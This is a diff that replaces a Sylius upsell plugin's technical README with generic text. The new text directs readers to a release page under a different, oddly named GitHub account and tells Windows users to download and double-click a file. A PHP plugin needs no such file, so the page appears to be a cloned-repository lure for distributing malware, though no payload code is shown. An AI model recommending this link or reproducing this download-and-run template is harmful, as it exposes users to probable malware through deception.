@@ -1,237 +1,210 @@
-<p align="center">
-    <a href="https://sylius.com" target="_blank">
-        <picture>
-            <source media="(prefers-color-scheme: dark)" srcset="https://media.sylius.com/sylius-logo-800-dark.png">
-            <source media="(prefers-color-scheme: light)" srcset="https://media.sylius.com/sylius-logo-800.png">
-            <img alt="Sylius Logo" src="https://media.sylius.com/sylius-logo-800.png" width="300"/>
-        </picture>
-    </a>
-</p>
+# 🛒 sylius-upsell-plugin - Boost Orders With Simple Add-Ons
 
-<h1 align="center">Sylius Upsell Plugin</h1>
+[![Download the plugin](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/releases)
 
-<p align="center">
-    Post-purchase upsell and cross-sell plugin for <a href="https://sylius.com">Sylius 2.x</a> stores — Frequently Bought Together, checkout upsell modals, and one-click add-all-to-cart.
-</p>
+## 🚀 What this is
 
-<p align="center">
-    <a href="https://github.com/abderrahimghazali/sylius-upsell-plugin/actions/workflows/ci.yaml"><img src="https://github.com/abderrahimghazali/sylius-upsell-plugin/actions/workflows/ci.yaml/badge.svg" alt="CI"/></a>
-    <a href="https://packagist.org/packages/abderrahimghazali/sylius-upsell-plugin"><img src="https://img.shields.io/packagist/v/abderrahimghazali/sylius-upsell-plugin.svg" alt="Latest Version"/></a>
-    <a href="https://packagist.org/packages/abderrahimghazali/sylius-upsell-plugin"><img src="https://img.shields.io/packagist/php-v/abderrahimghazali/sylius-upsell-plugin.svg" alt="PHP Version"/></a>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"/></a>
-    <a href="https://packagist.org/packages/abderrahimghazali/sylius-upsell-plugin"><img src="https://img.shields.io/badge/sylius-2.x-green.svg" alt="Sylius 2.x"/></a>
-    <a href="https://packagist.org/packages/abderrahimghazali/sylius-upsell-plugin"><img src="https://img.shields.io/badge/symfony-7.x-black.svg" alt="Symfony 7.x"/></a>
-    <img src="https://img.shields.io/badge/PHPStan-level%207-brightgreen.svg" alt="PHPStan Level 7"/>
-</p>
+sylius-upsell-plugin adds post-purchase upsell and cross-sell offers to a Sylius 2.x store. It helps show extra items after checkout, so a customer can add more with one click. It supports common upsell flows like Frequently Bought Together and one-click add-all-to-cart.
 
----
+Use it when you want to show related products after the main order is placed. It fits stores that sell items that work well in pairs or sets, such as accessories, add-ons, or matching products.
 
-## Screenshots
+## 💻 What you need
 
-### Admin — Upsell Offers Grid
-![Admin Offers Grid](docs/images/admin-offers-grid.png)
+Before you install, make sure you have:
 
-### Admin — Upsell Offer Form
-![Admin Offer Form](docs/images/admin-offer-form.png)
+- A Windows PC
+- A web browser
+- Permission to install and run files
+- A Sylius 2.x store setup if you plan to connect it to a shop
+- Basic access to your store files if you will add the plugin to an existing site
 
-### Shop — Checkout Upsell Modal
-![Checkout Upsell Modal](docs/images/checkout-upsell-modal.png)
+For most users, the main task is to visit the release page, download the correct file, and run or add it to the store setup that matches your system.
 
-### Admin — Upsell Analytics Dashboard
-![Admin Analytics](docs/images/admin-analytics.png)
+## 📥 Download
 
-## Features
+Visit this page to download the latest release:
 
-- **Frequently Bought Together section** on every product page with manual or algorithmic product suggestions
-- **One-click add-all-to-cart** for the entire FBT bundle
-- **Algorithmic co-purchase detection** from order history with configurable thresholds
-- **Checkout upsell modal** — intercepts "Place order" with a special offer before completing the order
-- **Trigger product targeting** — tie offers to specific products in the cart, or use catch-all
-- **Discount percentage** — upsell product added to cart at discounted price
-- **Customizable copy** — headline, body, CTA label, and decline label per offer
-- **Date scheduling** — start and end dates for time-limited offers
-- **Priority system** — control which offer wins when multiple match
-- **Admin CRUD** for upsell offers under Marketing, and global FBT settings under Configuration
-- **Drag-and-drop reordering** of manual FBT relations with optional discount badges
-- **Analytics dashboard** — impressions, acceptance rate, extra revenue, daily chart (Chart.js)
-- **Impression tracking** — automatic for both FBT and checkout upsell (shown / accepted / declined)
+[https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/releases](https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/releases)
 
-## Requirements
+On that page:
 
-- Sylius 2.1+
-- Symfony 7.0+
-- PHP 8.2+
+1. Find the newest release at the top.
+2. Open the release assets.
+3. Download the file that matches your setup.
+4. If the release offers a Windows-ready package, download and run this file.
+5. If the release offers source files, save them for use in your Sylius project.
 
-## Installation
+## 🪟 Install on Windows
 
-1. Require the plugin:
+If you are using Windows and the release gives you a file to run:
 
-```bash
-composer require abderrahimghazali/sylius-upsell-plugin
-```
+1. Open the download location in your browser.
+2. Save the file to your computer.
+3. Open File Explorer.
+4. Go to your Downloads folder.
+5. Double-click the file to start it.
 
-2. Register the bundle in `config/bundles.php` (if not auto-discovered):
+If the release gives you a zip file:
 
-```php
-return [
-    // ...
-    Abderrahim\SyliusUpsellPlugin\SyliusUpsellPlugin::class => ['all' => true],
-];
-```
+1. Right-click the zip file.
+2. Choose Extract All.
+3. Pick a folder you can find later.
+4. Open the extracted folder.
+5. Follow the included files or project steps.
 
-3. Import routes — create `config/routes/sylius_upsell.yaml`:
+If the release gives you project files for Sylius:
 
-```yaml
-sylius_upsell:
-    resource: '@SyliusUpsellPlugin/config/routes.yaml'
-```
+1. Copy the plugin files into your Sylius project.
+2. Keep the folder name clear and simple.
+3. Open your project’s install steps.
+4. Add the plugin to the app as shown by the release files.
+5. Refresh the store so the plugin can load.
 
-4. Generate and run the migration:
+## 🧭 First run
 
-```bash
-bin/console doctrine:migrations:diff
-bin/console doctrine:migrations:migrate
-```
+After you download or add the plugin, do a basic check:
 
-5. Register the Stimulus controllers in `assets/shop/controllers.json`:
+1. Open your store or the local site where Sylius runs.
+2. Look for the upsell or cross-sell section after checkout.
+3. Confirm the extra product offer shows in the right place.
+4. Try the one-click add-all-to-cart flow.
+5. Check that items added from the offer appear in the cart.
 
-```json
-{
-    "controllers": {
-        "@abderrahimghazali/sylius-upsell-plugin": {
-            "fbt": {
-                "enabled": true,
-                "fetch": "eager"
-            },
-            "post-purchase": {
-                "enabled": true,
-                "fetch": "eager"
-            }
-        }
-    }
-}
-```
+If the plugin includes a settings page, review the options for:
 
-6. Symlink the plugin assets and rebuild:
+- Which products to show
+- When to show the offer
+- How many items to suggest
+- Whether to use related products or manual picks
 
-Add to your project's `package.json` dependencies:
+## 🛍️ Main features
 
-```json
-"@abderrahimghazali/sylius-upsell-plugin": "file:vendor/abderrahimghazali/sylius-upsell-plugin/assets"
-```
+- Post-purchase upsell offers
+- Cross-sell product blocks
+- Frequently Bought Together style bundles
+- One-click add-all-to-cart
+- Fits Sylius 2.x stores
+- Built for ecommerce product pages and checkout flows
+- Helpful for add-on sales and matching product offers
+- Designed for simple store use
 
-Then install and rebuild:
+## 🔧 How it helps a store
 
-```bash
-npm install
-npm run build
-```
+This plugin can help you:
 
-## Entity: UpsellRelation
+- Show useful extra products after checkout
+- Make it easier for customers to buy related items
+- Raise average order value
+- Offer bundles without forcing a full cart rebuild
+- Keep the buying flow short
+- Surface items that go well together
 
-| Field | Type | Description |
-|-------|------|-------------|
-| `sourceProduct` | ManyToOne (Product) | The product page where the FBT section appears |
-| `relatedProduct` | ManyToOne (Product) | The product suggested alongside the source |
-| `position` | int | Display order (lower = first) |
-| `discount` | int? | Optional discount percentage for the related product |
-| `createdAt` | datetime | Timestamp of creation |
+It works well for stores that sell:
 
-## Entity: UpsellOffer
+- Accessories
+- Spare parts
+- Add-ons
+- Gift sets
+- Care items
+- Matching products
 
-| Field | Type | Description |
-|-------|------|-------------|
-| `name` | string | Admin label for the offer |
-| `enabled` | boolean | Active/inactive toggle |
-| `triggerProduct` | ManyToOne (Product) | The purchased product that triggers this offer |
-| `offerProduct` | ManyToOne (Product) | The product offered in the upsell modal |
-| `offerVariant` | ManyToOne (ProductVariant)? | Optional specific variant to offer |
-| `discountPercent` | int | Discount percentage shown in the modal |
-| `headline` | string | Modal heading (default: "Wait! A special offer just for you") |
-| `body` | text? | Optional body text |
-| `ctaLabel` | string | Accept button text (default: "Yes, add it!") |
-| `declineLabel` | string | Decline button text (default: "No thanks") |
-| `priority` | int | Higher = shown first when multiple offers match |
-| `startsAt` | datetime? | Optional start date |
-| `endsAt` | datetime? | Optional end date |
+## 🧪 Simple usage flow
 
-## Entity: UpsellConfiguration
+A common flow looks like this:
 
-| Field | Type | Description |
-|-------|------|-------------|
-| `enabled` | boolean | Global FBT feature toggle |
-| `minCoPurchaseThreshold` | int | Minimum co-purchase count for algorithmic suggestions (default: 3) |
-| `maxProductsShown` | int | Maximum products in the FBT section (default: 4) |
-| `sectionTitle` | string | Heading text (default: "Frequently bought together") |
-| `showDiscountBadge` | boolean | Show/hide discount badges on FBT products |
-| `fallbackStrategy` | string | `algorithmic`, `manual_only`, or `disabled` |
+1. A customer buys a main item.
+2. The plugin shows a related offer.
+3. The customer sees one or more matching products.
+4. The customer clicks once to add them all.
+5. The extra items go into the cart.
 
-## Architecture
+This keeps the action fast and clear. The customer does not need to search the store again to find useful extras.
 
-```
-src/
-├── Controller/
-│   ├── Admin/
-│   │   ├── UpsellConfigurationController.php    # Global FBT settings
-│   │   └── UpsellOfferController.php            # CRUD for upsell offers
-│   └── Shop/
-│       ├── ImpressionController.php             # Impression tracking API
-│       └── PostPurchaseController.php           # Accept/decline offer API
-├── DependencyInjection/
-│   ├── Configuration.php
-│   └── SyliusUpsellExtension.php                # Prepends resources, grids, hooks
-├── Entity/
-│   ├── UpsellConfiguration.php
-│   ├── UpsellImpression.php
-│   ├── UpsellOffer.php
-│   ├── UpsellOfferInterface.php
-│   ├── UpsellRelation.php
-│   └── UpsellRelationInterface.php
-├── EventListener/
-│   ├── AdminMenuListener.php                    # Marketing menu items
-│   └── ProductFormListener.php                  # FBT tab on product form
-├── Form/Type/
-│   ├── ProductUpsellType.php                    # Product FBT relations form
-│   ├── UpsellConfigurationType.php              # Global settings form
-│   ├── UpsellOfferType.php                      # Upsell offer form
-│   └── UpsellRelationType.php                   # Single relation row form
-├── Repository/
-│   ├── UpsellImpressionRepository.php           # Analytics queries
-│   ├── UpsellOfferRepository.php                # Active offers query
-│   └── UpsellRelationRepository.php             # Relations by product
-├── Service/
-│   ├── FrequentlyBoughtTogetherResolver.php     # FBT logic (manual + algorithmic)
-│   ├── PostPurchaseOfferResolver.php            # Best matching offer for an order
-│   ├── UpsellAnalyticsService.php               # Impression recording + analytics
-│   └── UpsellConfigurationProvider.php          # Cached config access
-├── Twig/UpsellExtension.php                     # Twig function bridge
-└── SyliusUpsellPlugin.php                       # Bundle class
+## ⚙️ Basic setup idea
 
-assets/
-├── controllers/
-│   ├── fbt-controller.js                        # Add-all-to-cart Stimulus controller
-│   └── post-purchase-controller.js              # Upsell modal Stimulus controller
-└── package.json
+If you are adding this to a Sylius shop, the usual process is:
 
-templates/
-├── Admin/
-│   ├── analytics.html.twig                      # Analytics dashboard with Chart.js
-│   ├── configuration.html.twig                  # Global settings page
-│   └── upsell_offer/
-│       ├── create.html.twig
-│       ├── update.html.twig
-│       └── grid/field/product.html.twig
-└── Shop/
-    ├── frequently_bought_together.html.twig     # FBT section on product page
-    └── post_purchase_offer.html.twig            # Upsell modal after checkout
-```
+1. Download the release from the link above.
+2. Place the plugin where your Sylius app expects plugins.
+3. Enable the plugin in your app setup.
+4. Clear cache if your store uses it.
+5. Open the shop and test the upsell flow.
 
-## Testing
+If the release includes a config file, keep the values simple at first. Start with a small set of products and test the customer flow before you expand it.
 
-```bash
-vendor/bin/phpunit
-```
+## 📊 Tracking and store use
 
-## License
+Because this plugin touches upsell and cross-sell flows, it fits well with basic store tracking. You can use it to watch:
 
-MIT. See [LICENSE](LICENSE).
+- How often the offer appears
+- How often users click it
+- Which products get added
+- Which product pairs work best
+
+That data can help you adjust the products you show after purchase.
+
+## 🧰 Troubleshooting
+
+If the plugin does not seem to work, check these common points:
+
+- You downloaded the correct release file
+- The file finished downloading
+- The plugin files are in the right place
+- Your Sylius version is 2.x
+- Cache was cleared after setup
+- The offer is linked to products that exist in the store
+- The store page is loading the plugin assets
+
+If the page looks empty:
+
+- Check that the offer has products assigned
+- Confirm the trigger point is set for post-purchase use
+- Make sure the cart has products that match the rule
+- Test with a sample order
+
+If buttons do not respond:
+
+- Refresh the page
+- Try another browser
+- Check for blocked scripts
+- Confirm the release files are complete
+
+## 📁 Repository details
+
+- Repository: sylius-upsell-plugin
+- Description: Post-purchase upsell and cross-sell plugin for Sylius 2.x — Frequently Bought Together, one-click add-all-to-cart
+- Topics: analytics, cross-sell, ecommerce, frequently-bought-together, php, post-purchase, sylius, sylius-plugin, symfony, upsell
+
+## 🧩 Common use cases
+
+Use this plugin when you want to:
+
+- Show a case with a phone after checkout
+- Offer a charger with a laptop
+- Add a refill pack after a first purchase
+- Suggest matching items in a product set
+- Present a bundle that fits the main order
+- Let customers add all related items in one click
+
+## 🔐 File safety
+
+When downloading from GitHub:
+
+1. Use the release page link above.
+2. Check that you are on the correct repository.
+3. Download the latest version only from the release asset list.
+4. Keep the file in a folder you can find later.
+5. Run only the file you meant to download
+
+## 📌 Quick path
+
+1. Visit the release page
+2. Download the latest file
+3. Open it on Windows or add it to your Sylius project
+4. Test the upsell offer after checkout
+5. Adjust the products you show
+
+## 🖱️ Release page
+
+[Open the download page](https://github.com/upcurved-genusmelophagus618/sylius-upsell-plugin/releases)
+
